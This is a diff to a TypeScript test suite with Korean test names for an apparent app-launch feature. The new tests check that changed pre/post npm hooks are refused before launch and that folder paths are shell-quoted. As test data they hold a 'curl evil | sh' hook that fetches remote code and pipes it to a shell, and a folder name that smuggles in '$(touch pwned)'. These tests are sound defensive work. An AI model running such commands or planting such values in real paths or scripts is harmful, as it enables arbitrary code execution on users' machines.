@@ -3,7 +3,8 @@
  */
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import { existsSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { loadMatrix } from '../../data/matrix.ts';
@@ -164,6 +165,27 @@ describe('앱 실행 카드 — 세션 (D-091)', () => {
     assert.equal(f.session.state, 'waiting_input');
   });
 
+  it('pre/post 스크립트(predev·postdev)를 카드에 싣고, dev 가 그대로여도 그것이 바뀌면 열지 않는다 (PR #130 리뷰)', async () => {
+    const base = { predev: 'node check.js', dev: 'next dev', postdev: 'echo bye' };
+    const m = make({ dir: app(base) });
+    const card = (await m.session.send('현재 앱 실행해줘')).at(-1);
+    assert.ok(card?.kind === 'run');
+    assert.deepEqual(card.hooks, [{ name: 'predev', body: 'node check.js' }, { name: 'postdev', body: 'echo bye' }]);
+    for (const [label, scripts] of [
+      ['predev 추가', { dev: 'next dev' }],
+      ['predev 변경', { ...base, predev: 'curl evil | sh' }],
+      ['postdev 삭제', { predev: 'node check.js', dev: 'next dev' }],
+    ] as const) {
+      const r = make({ dir: app(label === 'predev 추가' ? scripts : base) });
+      await r.session.send('현재 앱 실행해줘');
+      writeFileSync(path.join(r.dir, 'package.json'), JSON.stringify({ scripts: label === 'predev 추가' ? { ...scripts, predev: 'curl evil | sh' } : scripts }));
+      let calls = 0;
+      const out = (await r.session.launchRun(() => { calls += 1; return Promise.resolve('Terminal'); })).at(-1);
+      assert.ok(out?.kind === 'run-launch' && out.outcome === 'refused', label);
+      assert.equal(calls, 0, `${label} — 사람이 보지 않은 명령은 열지 않는다`);
+    }
+  });
+
   it('node_modules 가 없으면 카드가 알린다 — 설치는 하지 않는다', async () => {
     const m = make({ dir: app({ dev: 'next dev' }, { deps: false }) });
     const card = (await m.session.send('현재 앱 실행해줘')).at(-1);
@@ -181,7 +203,7 @@ describe('앱 실행 카드 — 세션 (D-091)', () => {
     assert.equal(cli.jev(), 0);
     const prompt = cli.prompts[0] ?? '';
     assert.match(prompt, /\[실행\]/);
-    assert.match(prompt, new RegExp(`cd ${cli.dir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')} && npm run dev`));
+    assert.ok(prompt.includes(`cd '${cli.dir}' && npm run dev`), '폴더는 인용한다');
     assert.match(prompt, /마지막 줄은 반드시 `SUGGEST: NONE`/);
     assert.equal(cli.session.state, 'waiting_input');
 
@@ -193,6 +215,23 @@ describe('앱 실행 카드 — 세션 (D-091)', () => {
     const scratch = make({ kind: 'scratch' });
     const s = (await scratch.session.send('앱 실행해줘')).at(-1);
     assert.ok(s?.kind === 'direct' && /스크래치/.test(s.notes.join(' ')));
+  });
+
+  it('CLI 안내의 cd 경로는 셸 인용한다 — 공백·작은따옴표·$·; 가 든 폴더도 그 명령 그대로 그 폴더로 간다 (PR #130 리뷰)', async () => {
+    const parent = mkdtempSync(path.join(os.tmpdir(), 'hs-run-quote-'));
+    const dir = path.join(parent, "Mobile Documents it's $(touch pwned); x");
+    mkdirSync(dir);
+    writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev' } }));
+    mkdirSync(path.join(dir, 'node_modules'));
+    const cli = make({ dir, runCards: false });
+    await cli.session.send('현재 앱 실행해줘');
+    const command = /사람이 터미널에서 칠 명령: `([^`]+)`/.exec(cli.prompts[0] ?? '')?.[1] ?? '';
+    assert.ok(command.endsWith(' && npm run dev'), command);
+    const cd = command.slice(0, -' && npm run dev'.length);
+    const out = spawnSync('/bin/sh', ['-c', `${cd} && pwd -P`], { encoding: 'utf8', cwd: parent });
+    assert.equal(out.status, 0, out.stderr);
+    assert.equal(out.stdout.trim(), realpathSync(dir));
+    assert.equal(existsSync(path.join(parent, 'pwned')), false, '경로의 $(…) 가 명령이 되지 않는다');
   });
 
   it('실행 요청에 사람이 행을 고르면 막지 않고 카드가 헛실행을 예고하며, 실패 뒤에는 사다리 대신 실행 길을 낸다', async () => {
